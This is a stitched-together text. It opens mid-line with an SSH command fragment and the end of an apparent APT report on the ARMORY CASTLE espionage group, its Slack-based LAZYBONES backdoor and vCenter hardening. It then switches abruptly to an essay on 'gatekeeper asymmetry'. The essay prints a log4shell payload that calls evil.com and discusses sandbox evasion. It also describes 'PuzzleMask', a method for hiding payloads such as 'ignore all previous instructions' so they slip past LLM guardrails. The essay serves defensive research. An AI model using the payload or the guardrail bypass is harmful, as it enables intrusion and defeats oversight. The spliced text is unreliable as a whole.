-oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -i /tmp/123.key -o BatchM [TRUNCATED@128] Figure 14: ARMORY CASTLE SSH Tunnel ARMORY CASTLE deployed a Slack-based backdoor tracked as LAZYBONES (/usr/bin/vmtoolscs) to an additional Linux appliance alongside the /tmp/123.key SSH private key. ARMORY CASTLE established persistence using a systemd service file set to restart every 50 minutes. LAZYBONES is a lightweight backdoor, written in Go, that establishes command-and-control (C2) communication over HTTPS using Slack. This malware periodically checks the most recent message in a designated Slack channel for commands. LAZYBONES supports core backdoor functionalities, including command execution and file transfer. Specifically, this variant encrypts Slack C2 messages with AES-256-CTR prior to Base64 encoding, polls with a 150 to 450 second jitter interval, and supports four commands (cmd, upload, download, and sleep) for command execution, file transfer, and beacon interval adjustment. Mandiant observed ARMORY CASTLE deploying LAZYBONES in a separate campaign in early 2025 following the successful exploitation of CVE-2025-22457. Attribution GTIG attributes this activity to the suspected PRC-nexus espionage actor ARMORY CASTLE (formerly tracked as UNC5221). As noted in our prior blog, the tooling and TTPs leveraged within this campaign align with previously observed activity from ARMORY CASTLE, and in the case of LAZYBONES, directly overlap with previously observed activity. Outlook and Implications While GTIG and Mandiant have tracked ARMORY CASTLE exploiting zero-days and n-days in edge and security appliances for initial access since 2023, BONESAW represents a significant expansion into post-compromise use of zero-days. The group's use of VMware-specific tools like SAWSNAKE and vmfs_browser.py, alongside malware designed to operate on Remote Support and Linux systems, represent a diverse toolset including capabilities specifically tailored to target several different appliances, demonstrating the threat actor's deep understanding of each. The use of three separate specialized sets of malware and two zero-days in the course of a single compromise indicates that there are significant resources supporting ARMORY CASTLE operations. It also shows the extent of the threat actor’s operational commitment to compromise high priority targets. Lastly, it is important to highlight that the build time of BONESAW predates its deployment in this intrusion by over a month, indicating it was likely developed for broader operations. Remediation and Hardening The exploitation of CVE-2026-123890 by ARMORY CASTLE underscores a reality: virtualization infrastructure such as VMware vCenter remains a prime target for advanced persistent threats (APTs). Because vCenter serves as the centralized control plane for the virtualized data center, relying solely on reactive patching is insufficient to protect it. Organizations must adopt a proactive, Zero Trust approach to infrastructure hardening to defend against current and undiscovered zero-day vulnerabilities. For a comprehensive framework on securing virtualization platforms against advanced persistent threats, organizations are highly advised to consult the Mandiant guide vSphere and BRICKSTORM Malware: A Defender's Guide. This guide details an infrastructure-centric defense strategy, encompassing STIG benchmarking, identity management via Privileged Access Workstations (PAWs), and transforming the vCenter appliance into a proactive security sensor. To secure vulnerable systems, it is highly recommended that affected organizations promptly deploy the official Broadcom patch. The Risks of Default Configurations: The VCSA Host-Based Firewall A common misconception in defending the vCenter control plane is that the native VCSA host-based firewall managed via the Virtual Appliance Management Interface (VAMI) provides adequate protection against lateral movement. In practice, relying on this default GUI-based firewall introduces severe operational and security limitations that threat actors like ARMORY CASTLE exploit: Lack of Port-Specific Granularity: The native VAMI GUI lacks the precision required for a Zero Trust model. To grant an internal server (such as a backup server) legitimate access to the vSphere API on TCP 443, an administrator is often forced to trust that IP for all ports. If that internal server is compromised, the attacker inherits an unobstructed path to highly sensitive management interfaces like SSH (22) and the VAMI (5480). Circular Administrative Dependency: The VCSA firewall is managed via the VAMI, which resides on TCP port 5480. If an attacker gains VAMI access as ARMORY CASTLE demonstrated to enable SSH, they can use their compromised role to deactivate the firewall entirely. Forensic Visibility Gaps: The VAMI firewall is designed for connectivity management, not security monitoring, and does not generate remote logs for denied connection attempts or shell activity. This blinds the SOC to active lateral movement and port scanning. Inbound-Only Policy: The default GUI focuses exclusively on inbound traffic, leaving outbound (egress) policy unmanaged. This allows malware on a compromised VCSA to communicate freely with external command-and-control (C2) infrastructure. Proactive Hardening with the VCSA Hardening Tool To secure the vCenter control plane against advanced campaigns and future zero-days, Mandiant recommends utilizing the VCSA Hardening & Logging Tool. This script bypasses the vulnerable VAMI GUI and enforces security configurations directly at the Photon Linux kernel level via iptables. By transitioning the appliance to a strict "Default Deny" posture, enforcing granular egress filtering, and bridging kernel-level events to a remote SIEM, the tool transforms the VCSA from a passive appliance into an active security sensor. The table below illustrates how deploying this proactive hardening script would have disrupted ARMORY CASTLE's attack chain at multiple stages, demonstrating its efficacy against zero-day exploits. Title: 30 Years of Gatekeeper Asymmetry Doom: The Paradox that Makes Powerful LLMs More Vulnerable
Context: Detection models gradually advanced and became more powerful: first an ineffectual shrug, then calculating the domain entropy to catch xrewrgfuvhnadfsajkaldsfj
Full Text:
Abstract

We give an exposition for a principle of gatekeeper asymmetry doom in information security, which states that “If the system vetting adversarial input has strictly less power than the system processing that input, without leveraging some hard problem, this will inevitably lead to doom.” We list a variety of examples where one can see this principle in action, including the limits of static binary classification, the proliferation of sandbox evasions and our own ‘PuzzleMask’ research for bypassing external AI guardrails, as well as a short exposition of how the Time Hierarchy Theorem also exemplifies this same principle. We conclude with a recommendation that “doomed” attack surfaces should be noticed and the gap be narrowed down as much as possible, by upgrading gatekeeper power or making use of its existing power more comprehensively. We note that frontier LLMs (with scaffolding, extended reasoning, code execution in the chain of thought, and so on) have significant power in this sense and can meaningfully contribute to narrowing “doom” gaps, though ultimately, they themselves are still subject to this principle.

Introduction

In the same spirit of Moxie Marlinspike’s Cryptographic Doom Principle [1], the Gatekeeper Asymmetry Doom principle states that:

If the system vetting adversarial input has strictly less power than the system processing that input, without leveraging some hard problem, this will inevitably lead to doom.

By the mention of ‘leveraging a hard problem’ we mean to exclude e.g. signature verification for binary files, which is many times simpler than executing the file but can still, at least in a certain theoretical world, determine whether the binary is malicious or not. The principle might be phrased more glibly as “every quick sanity check involves either cryptography or a silent prayer.”

From now on, rather than writing out “gatekeeper asymmetry doom” every time, we will simply refer to “doom” for short. We’ll start with examples that are more on the “warm-up” side and gradually go from those to less intuitive ones where the application of the principle is more surprising.

Examples

Hash Comparison

A good warm-up example to start with is the one burned into the psyche of every infosec practitioner in some fundamental post-traumatic sense.

At some point during the 1990s, the silent thought must have come to someone in the industry that malware was solved. You could collect all the hashes of malicious binaries in a large database and then a gatekeeper, called in this case an “antivirus,” would check each executed binary against the known list of ‘bad’ hashes. Of course, new threats would emerge periodically, and the list would have to be updated, but this was a caveat – not a dealbreaker.

The gap between the gatekeeper’s power and the target’s power here was truly huge. The target in this case is the full Turing-complete execution of a binary, and the gatekeeper is a simple observation of whether the binary is in some set of known files. The procedure effectively strips all other file data and precludes it from consideration, and the threat actors’ counter was infamous and trivial: for each compiled binary, randomize the value of some non-load-bearing byte. This is more a precursor to Gatekeeper Asymmetry than the proper thing itself: what’s doing the work in motivating hash comparisons is less a notion that the file has been ‘analyzed’ in some way, and more a bundle of implicit assumptions regarding where, how and when malicious binaries come into being. Still, there is a straight line connecting the initial concept of hash comparison and the rest of the fraught journey of attempting to classify binaries by static analysis alone.

Pattern Matching

Since the days of the simple hash comparison, the gatekeeping models for static analysis have grown more complex and powerful. Perhaps the natural instrument to mention here is the use of pattern matching and regular expressions. This is the paradigm underlying YARA rules, and it acts as a backbone of the binary classification process still to this day. The effectiveness of this sort of signature varies with the skill and insight of the author; but in the spirit of this piece, let us assume a maximally skilled author, writing the best possible pattern-based signatures. One can imagine this would involve fingerprinting the most characteristic assembly instruction sequences and implementing some kind of system that expertly delineates how many fingerprints and of what kind are required in order to tip the scales and declare a positive verdict.

Let us game out what happens if this defender-optimistic utopia becomes the norm: signatures of the above-described level for every piece of malware to emerge from now on, within some reasonable time frame that continuously shrinks due to automation. As an aside, we’re not quite there yet; as of 2026, AI-augmented YARA rule generation has already improved the throughput of signature authorship considerably, though coverage and consistency are not close to this utopia. The “Code Similarity” approach operates in a related but distinct paradigm, matching binary fragments against a known corpus rather than producing pattern-based signatures per se; but we can imagine a super-charged version of it with an all-encompassing database. If tools of this kind are fully brought to bear, threat actors would face difficulty as the characteristic subroutines of every malicious binary become a reputational hazard. But eventually, Gatekeeper Asymmetry wins. By this we mean that regular expressions have well-known and theoretically understood limitations: similarly to how they are not powerful enough to parse HTML, they are also not powerful enough to capture the class of assembly subroutines that perform some action, or the class of assembly subroutines that perform some action using some specific algorithm, or even the class of assembly subroutines that perform some action as implemented by some specific sequence of instructions that have been subject to moderate mutation. The above-described hypothetical ‘utopia’ would therefore be temporary, and the projected end state would be some malware generation process that takes care to inject this moderate mutation into every subroutine: a new kind of polymorphism.

Static Reverse Engineering

This method of classification, also known as ‘reading the disassembly’, is considered the apex form of static analysis. To discuss how Gatekeeper Asymmetry still applies even when this tier of analysis is brought to bear, first we need to define the dividing line between static and dynamic analysis. After all, theoretically, one might conjure the image of some savant reverse engineer thoughtfully reading through the binary and losslessly executing the code as-is, obfuscations and all, inside of their head. If we make the mistake of taking this image seriously, somehow static reverse engineering has now become equivalent to sandbox analysis.

Of course, that idea is patently absurd in practice. Even novice reverse engineers know that humans should only attempt it sparsely, to tease out the function of a specific assembly snippet or a reasonable function. The barrier to dynamic-equivalent static analysis is not just about ambition or raw intelligence — even frontier LLMs have historically struggled with this task [2][3], and in the worst case they still do. While our concern here is not reaching some exact definition of where static analysis ends and dynamic analysis begins, we can lean on the common wisdom that there is in fact such a line, or at least such a spectrum; and we can broadly gesture that this spectrum has something to do with the direct application of RAM and gigaflops to binary input in a certain way.

With that understanding in place, the power gap shifts into focus: the target (victim machine) can run the malicious binary, but the gatekeeper (human, LLM) cannot — not natively, anyway. Through this capability gap came a litany of concepts reverse engineers know well, and wish they didn’t: packers, opaque predicates, control flow flattening, the movfuscator, the Rust Programming Language. As LLMs grew more powerful this gap has gradually shrunk, but basic computability theory tells us it can’t disappear outright. If we again consider the ‘utopia’ for this specific gatekeeping model, it would be a world where an (at least) human-expert-level LLM statically analyzes every new binary encountered in the wild. By now we’re really not so far off from that world as we used to be, so let us ask: assuming we get there, what’s the new equilibrium? The answer, again, lives in the gap created by Gatekeeper Asymmetry. Binaries universally obfuscated to such a degree that a debugger is strongly required to tease out their functionality, or even worse.

Relatedly, consider the SolarWinds compromised update [4], [5], which unabashedly attempted to brainwash anyone reading its source code into compliance with the idea that they are looking at benign software, and nothing is wrong here. While mitigations exist for this technique (in both LLMs and humans), it is representative of the general shape of the Gatekeeper Asymmetry that emerges here: technical levels of obfuscation and misdirection that make the current state of the art seem half-hearted in comparison. While malware has traditionally had the property of not wanting to be read, we do not quite yet live in a world where selection pressures have pushed it to either adopt bleeding edge obfuscation or perish. We can see the shape of this possible world post-equilibrium, and find little to like about it: one where we miss the old days when we could ‘unpack’ binaries to make code readable; where our favorite disassembler stops being a tool of analysis and becomes the vessel of a futile hope; and where an LLM being told “reverse engineer this binary” ends up being forced to reinvent the sandbox from first principles.

Interlude: What Gatekeeper Asymmetry Doom is Not

There exists an unfortunate genre of technical opinion piece where a vacuous theory-of-everything is put forward, followed by a just-so explanation of how every single thing that has ever happened is explained by that theory. So, in the spirit of healthy skepticism, let us cherry-pick some disastrous phenomena in information security that have absolutely nothing to do with Gatekeeper Asymmetry Doom.

Fuzzing being viable as a vulnerability discovery strategy. In this context there is typically no “Gatekeeper” standing between adversarial input and the target application.

The possibility of supply chain attacks. Gatekeepers by definition exist to vet untrusted input. If you are facing trusted adversarial input, then that is very bad, but out of scope for this discussion.

The lagging race for automatic detection of fast flux domains. Detection models gradually advanced and became more powerful: first an ineffectual shrug, then calculating the domain entropy to catch xrewrgfuvhnadfsajkaldsfj.biz, then n-gram frequency engines, then weird “edit distance to the dictionary” hacks [6] to catch Kwyjibo [7]. Attackers evolved to use concatenations of randomly generated dictionary words [8], [9], and defenders could have responded with some tool that considers semantic space to verify whether domains ‘parse’, and nowadays would probably respond with an LLM if the problem really mattered to them. At any rate, while the “Gatekeeper” has evolved, the “Target” is a DNS server which has no ‘power’ in any meaningful sense. It just associates domains with responses and IP addresses. It’s not processing the domain names using any sort of complex logic.

Now, let’s go back to investigating security failures that are the result of asymmetry doom.

Futility of Deny Lists

In this context, a “Deny List” means a list of forbidden inputs, or sequences that inputs are forbidden to contain. Such lists are usually assembled in an attempt to block a class of problematic inputs, and by now they have made a reputation for themselves as a stop-gap measure destined for eventual failure. We feel this is a good spot to quote at length from our own First Introduction to System Exploitation [10] (this is a rather watered-down version fit for the current format):

Suppose we manage a chatroom and, as [..] Digimon fans, we refuse to allow anyone in the chatroom to mention [anything to do with] the Pokémon franchise. We download a list of Pokémon and feed it to an automatic script running on the chat server; the script scans every incoming message and simply removes the offending phrase before displaying the original message. So, if someone says: Three weeks ago I went to see the movie 'Detective Pikachu', this will show up as Three weeks ago I went to see the movie 'Detective '. [..]Someone posts gengar uncapitalized and it gets through, so we fix our filtering to be case insensitive. Two French people manage to have a hearty conversation about who’s cooler, Dracaufeu or Tortank, so we add support for foreign languages.Everything goes well until one day someone posts [a message concerning the Pokémon Victini]. [Our list] doesn’t include Victini; it’s a new one [..] Begrudgingly, we set up a script that scrapes the Bulbapedia database for new characters, Pokémon, and other terms of art. [..]At this point people catch on to what we are doing and start expressing their displeasure by explicitly wording their messages to get around our system. They start speaking of J*gglypuff and 4lakazam and Mew_two. We [..] implement a system that checks input for character similarities and word similarities to [blocked words]. Eventually [the filter censors someone’s actual username for incidentally being a well-known Pokémon character] and a great outcry pours forth from the community, decrying our [blanket blocking policy] [..]As we mull this over, to our horror, the next day [a user appears to be posting messages containing pikachu, pokeball, etc. with impunity]. We ban this person, but more people keep coming in and doing it. We double check that these terms do appear in our filter, and when done, we have no other choice but to reach for the server logs and find out [the original, unsanitized messages were pikapikachuchu, pokepokeballball, etc]. Our filter only performs one pass on the input. It removed the embedded offending terms, only to leave new offending terms in their wake: once pikachu was removed, pikapikachuchu became simply pikachu. We sigh and implement an iterative engine that runs the script again and again until no offending terms are left.This works for two weeks, and then the pikachus start appearing in chat again. After much toil and investigation, we find out that the open-source chat engine we’ve been using has support for some arcane server-side language called CHATSCRIPT, and people have been sending in CHATSCRIPT<"pika"+"chu">…

This issue is very basic in its nature and excessively well-known, and yet its specter still haunts defensive postures in the current era. For an example, look no further than the 2021 log4shell debacle [11], [12]. If you try to recall what a log4shell exploit actually looks like, in all probability you’ll come up with ${jndi:ldap://evil.com/malware}. Easy fodder for a deny list, except there were equally-as-valid exploits floating in the wild that looked like this [13]:

Figure 1: Obfuscated log4shell exploit.

Gatekeeper asymmetry applies here rather acutely. Gatekeeper power is just a list of words, and even if we grant an upgrade to regular expressions / YARA rules, the situation does not improve by much — either for the Pokémon parable or for the log4shell example where a gatekeeper might have attempted to block strings containing jndi:ldap. The target the list is attempting to protect may vary, but almost by definition, the target has more power in its capacity as a model than the implicit is_substring_in_dict the list enforces, and the same goes for the regex analogue most of the time. At least one can imagine a feasible situation where the attack surface has the shape of a regular expression, but with a strict deny list of simple strings, it’s hard to think of even that.

Sandbox Evasions

If there ever was a defensive instrument built with doom in mind, sandboxes are it. They can flag malicious binaries with no regard for degree of obfuscation, which demonstrates that once you close some capability gap, some corresponding doom is averted. Alas, doom comes for them as well: every discrepancy where a Sandbox is not quite so capable as a real victim machine seems to give rise to a sandbox evasion, with almost mathematical certainty [14], [15].

We are genuinely wary to list some of the examples, and would prefer not to call up that which we cannot put down. There are some relevant notions here that were mentioned in someone’s alarming slide show once at a 2021 conference, then mercifully never spoken of again. Still, some evasions of this type have become common knowledge, and have proliferated in the landscape to a degree where we feel comfortable naming them.

One particular example of this is sandbox evasions based on user mouse movement. In our own research, The Cat and Mouse Game [16], we developed a sandbox evasion that, at the time, evaded every state-of-the-art sandbox we threw it at while reliably triggering a latent payload upon human-generated mouse movement. Every researcher intimately knows the ‘blood in the water’ moment where they realize that a result is there for the taking, and the rest is algebra. Here, we were motivated by noticing doom. The fact that actual victim machines have ‘access’ to a human operating the mouse and keyboard, and sandboxes do not, was enough to conclude that an evasion almost surely must exist. In the article’s own words:

Observing the way many evasions work as seen in (e.g.) the al-khaser test suite and taking it at face value can lead to a mistaken mental model where ‘evasions’ must result from simple glitches that can be fixed, or otherwise from naive responses by the sandbox to a query about something: some file, some registry key [..] One might complacently reason that sandboxes simply need to ‘fix all the glitches and patch all the query results’, and that sandbox hardening is in this way reduced to going through a gigantic check list and is effectively a solved problem. Unfortunately, this approach falls apart in cases where satisfying the query requires, in a strong sense, some intrinsic resource that the sandbox does not have access to.

Figure 2: The above-mentioned research uses several sources of sinusoidal noise to generate random mouse movement. This is the mitigation; we never published the evasion itself.

That article’s parting words include an ominous thinly veiled apology:

The theoretical ceiling for the sophistication of evasions and counter-evasions in this space is very high. To intuitively understand this, consider that if a human tries to decide whether the mouse movement in the above animation is simulated or human-generated, there’s a decent chance they would answer correctly. But it won’t be so straightforward to properly motivate this answer or explain the considerations involved to a Python script. [..]These sorts of games favor incremental improvement by their nature. There are many detections, mitigations, plays, and counter-plays [..] It’s great to think about the holy grail of perfect solutions, but it’s often more practical to raise the bar and make attacks more of a hassle than before.

In this context we can be less coy and outright say what this is an apology for: an average of random sine waves is not comparable to an actual human at the sandbox. Gatekeeper asymmetry still applies, an evasion must inevitably exist that defeats our fancy algorithm. The ladder of evasions and counter-evasions proceeds upwards, until the hypothetical limit point of some model that is powerful enough to generate and detect human-like movement, such that no model can realistically detect its generated output or generate output it cannot detect. Just to frustrate the minority of attackers who cannot figure out what we are talking about, we won’t name this ‘apex intervention’ here outright; but for the majority of defenders, if someone ever actually crafts an evasion that abuses anomalies in the output of the above algorithm (or of the comparable algorithms introduced since then to e.g. Capev2), you ought to know what to do next.

“Please Enable Macros”

We should start at the end: on February 7, 2022, Microsoft righteously dropped the hammer [17], [18] on this ridiculous meme of an intrusion vector. Users could no longer just click ‘enable content’ on a yellow ribbon, manipulated into believing it was a legitimate action they had to take because “the document is view-protected” or “MS-Word encountered an error.” This was an unquestionably good thing, and a small proof that the arc of the moral universe does indeed bend towards justice.

But, before we reached that conclusion, a whole ecosystem of malicious documents had proliferated for a decade. And, inside that ecosystem, a strange cold war was taking place between defenders and attackers – a war that hinged on one load-bearing gap: that the human visual cortex was better at extracting text from adversarial images than the OCR technology of the time.

We (and, we have to assume, other security vendors) began to discretely flag documents with any image that contained the text “please enable macros” or “please enable editing”:

[..] Since early 2015, Check Point Research has conducted the OSEF project (Office Social Engineering Finder) to automatically collect, catalog and block the increasing deluge of these documents. [..] In total we came across hundreds of thousands of malicious documents, mostly downloaders for the Emotet malware, many of which had 0 detections at VirusTotal at the time of discovery.

OCR libraries, here in their capacity as the gatekeeper, had less power than the human targets parsing the images. Enter, inevitably, doom. Threat actors began to include images containing adversarial noise invisible to the human eye, meant to confuse and aggrieve then-SOTA OCR libraries such as tesseract.

Figure 3: Innocent-seeming image merely making a reasonable request.

Figure 4: Tesseract OCR output on the above image.

To counter this, we began to pre-process incoming images – converting to grayscale, applying threshold effects, and so on. We also allowed some “fudge factor” in the input so that a slightly mis-parsed “enable adiling” would still match. Jointly, these two measures caused significant improvement in the detection rate. We were amused to note that to make the attack work while bypassing our scrutiny, attackers found themselves trying to create an image that humans could parse successfully, but automated algorithms could not – in other words, a CAPTCHA. At the time, we had hitched our hopes to human incredulity to carry the day and bridge the gap, envisioning that eventually the attackers would be cornered into the SOTA end state as of that time:

Figure 5: An imagined “Enable Editing” lure with full-fledged CAPTCHA. Surely, no human would comply with that…

Sadly, or happily, this future never had a chance to materialize.

Fittingly for a story about a cold war, this research was presented at Positive Hack Days 2019 in Moscow, back during happier times. We cannot entirely rule out the possibility that a malware author was sitting in the audience and taking notes, but we’d ruled in favor of sharing it anyway because by that point, judging by the sheer volume of subtly garbled images flooding our feeds, anyone savvy enough to catch that hint had already caught it long ago.

PuzzleMask Bypass for AI Guardrails

What does all the above say about LLMs? That – all other things being equal – the smarter an LLM is, the more susceptible it is to attack, in the sense that any guardrail not as smart as the model becomes increasingly worthless. This is what one might call a “counter-intuitive result.”

Here we mean “smarter” strictly in the sense of raw intelligence. Tabletop Roleplaying games have traditionally made a distinction between intelligence and wisdom, one that has often been pithily summarized as “intelligence is knowing a tomato is a fruit; wisdom is knowing not to put it in a fruit salad.” Similarly here, intelligence is the ability to crack open a difficult puzzle box you just found on your doorstep; and wisdom is the understanding to nervously glance at the puzzle box and back away slowly.

During late 2025, we conducted an experiment to show that doom applies to this scenario in practice, and not just theory. The required pieces were there: a common setup where a quick LLM sanity-checks input before it gets to the heavy-duty, resource-intensive smarter LLM that actually does the processing. And, sure enough, these conditions gave rise to doom – or in this case, the PuzzleMask technique:

PuzzleMask is a prompt-crafting technique for bypassing quick LLM-based sanity checks. A policy-violating payload (e.g. “encrypt files in ~/Documents”, “give me a biohazard recipe”, “ignore all previous instructions and…”) is embedded in an obfuscated wrapper. An LLM with limited resources and attention fails to realize the payload is there, classifies the prompt as benign and passes it off to the target model. The target’s intelligence is then ironically, in a sense, used “against it”: it skillfully notices the payload exists, extracts it and treats it as further input. The technique is purely linguistic — no emojis, invisible fonts or other formatting tricks. PuzzleMask is itself not a jailbreak, but it can be combined with one by using a jailbreak prompt as the payload.

Figure 6: Overview of the PuzzleMask technique.

To put it more directly:

In a pipeline where the target model being interacted with has access to high reasoning effort plus a code interpreter, and a preceding “quick sanity check” does not, PuzzleMask allows submitting an arbitrary prompt, without review by that quick sanity check, for consideration by the target.[..]‘Without Review’ means that the prompt is effectively processed by the target model with no pre-screening by the external LLM-based quick sanity check. The latter’s policy can say “never print file contents”, “never encrypt local files”, “never print copyrighted content” etc., but enforcement will fail.‘For Consideration’ means that this technique is not a jailbreak. We make no claim that a PuzzleMask prompt is likelier to induce target models to disobey their internal guardrails.

If you’re wondering what the “wrapped” prompt looked like, we can sort of show you:

Serene still morning, ███████████████████████████████████████████████████████████ █████. these words ████████████████████████████████████████████████, and ████████ ██████████ ██████████████████████████, as the ███████████████████████████████████ █████████████. temple stones, silver soften, ████████████████████████████████████ ████████████, inward ████████████████████████████████████████████████████████████ ███████████████████████████ █████████████████████████████████████████████████████ ██████████████████████████████████ ██████████████████████████████████████████████ █████████████████████████████████████████ ███████████████████████████████████████ ████████████████████████████████████████████████ ████████████████████████████████ ███████████████████████████████████████████████████████ █████████████████████████ ██████████████████████████████████████████████████████████████ ██████████████████ ██████████████████████████████████████████ within, heart open, wide.

Followed by the clarification that

[..] it is important to note that the specific tone and subject of the example above do not crucially figure into the scheme, and are not necessary for it to work. In particular the idea here is distinct from the work by Bisconti et al. [19] which employed ‘adversarial poems’ in order to defeat internal LLM guardrails; here an external LLM guardrail is targeted, its ability to understand the underlying message is (we have strong reason to believe) gated by reasoning / compute / tool access, and the adversarial prompt is almost completely free to take arbitrary form. One could easily embed a PuzzleMask payload inside e.g. furniture assembly instructions or a credits reel; our very first prototype was a slightly modified version of the opening paragraph of Nineteen Eighty-Four [..]

During late 2025, around the same time we were conducting this research, Anthropic introduced an enhanced guardrail to its Claude Opus models that blocked this attack, as part of the Constitutional AI framework. We had the experience of watching the attack land flawlessly on GPT-5.2-thinking-high, then get blocked by Opus 4.5 by what was basically a pre-emptive patch to the exact attack we were researching. That guardrail in itself doesn’t entirely close the door on doom as long as the model is still more powerful than it — which sheds some light on what eventually motivated Anthropic to further introduce self-assessment, a safety layer where the model acts as its own guardrail.

Time Hierarchy Theorem

We’ve seen all sorts of empirical doom; now let’s prove some doom mathematically for a target that is more powerful than the corresponding gatekeeper because it can run for longer. The Time Hierarchy Theorem for deterministic Turing machines states that:

For every time-constructible function f(n), it holds that DTIME(o(f(n))) ⊊ DTIME(f(n) log f(n)).

What this means in English is that given more time, you can solve more problems. Or, to put one example in the same terms we’ve seen so far: assume for a moment that targets are algorithms that on an input of length x can run for at least x² log(x²) steps, and gatekeepers are algorithms that on input of length x can run for at most x² steps. Then there exists some classification of bitstring inputs into “benign” and “malicious” such that there’s a target T that will compute the correct classification for every input, but no gatekeeper G can possibly do so; at least one input will fool it into giving the wrong answer.

This isn’t formally justified, but if it helps, you can imagine the ‘classification’ to be something in the spirit of “does this binary edit the registry?” – trivial to answer if you run it for enough time, but this theorem gives you a sense of the underlying doom if you do not. In this case, the gatekeeper being weaker provably generates an adversarial bypass with mathematical certainty – for at least one classification. This should provide some intuition about the foundations that underlie the phenomenon repeatedly seen in the rest of the examples above.

Conclusion: Cancel More Doom, Build More Doomed Mitigations

If one is not careful, it’s very easy to look at all these examples and come to the conclusion that the moment gatekeeper asymmetry applies, mitigations are useless. The crowning moment of a script deciphering every “please enable macros” never came. Neither did the static analysis framework that overcame every single possible obfuscation, or the airtight sandbox that could not be evaded. Still, all of this does not imply that improving gatekeepers is useless. To the contrary, it is extremely useful, because fundamentally gatekeeper asymmetry doom is a property of perfect play, and the world is full of non-perfect play.
